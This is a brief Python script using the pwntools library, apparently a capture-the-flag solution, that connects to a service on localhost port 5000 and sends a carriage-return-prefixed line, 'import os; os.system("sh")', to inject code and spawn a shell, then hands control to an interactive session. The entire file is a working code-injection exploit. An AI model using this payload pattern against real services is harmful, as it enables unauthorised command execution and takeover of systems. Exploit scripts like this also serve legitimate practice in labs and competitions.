from pwn import *

p = remote('localhost', 5000)

p.sendline(b'0')
p.sendline(b'\rimport os; os.system("sh")')
p.sendline(b'n')
p.interactive()
